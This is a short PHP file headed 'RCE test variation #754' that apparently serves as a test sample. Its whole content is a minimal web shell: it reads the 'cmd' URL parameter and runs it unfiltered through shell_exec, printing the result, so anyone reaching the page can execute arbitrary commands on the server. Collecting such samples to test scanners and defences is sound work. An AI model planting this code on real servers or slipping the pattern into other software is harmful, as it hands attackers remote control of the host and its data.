<?php
// RCE test variation #754
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>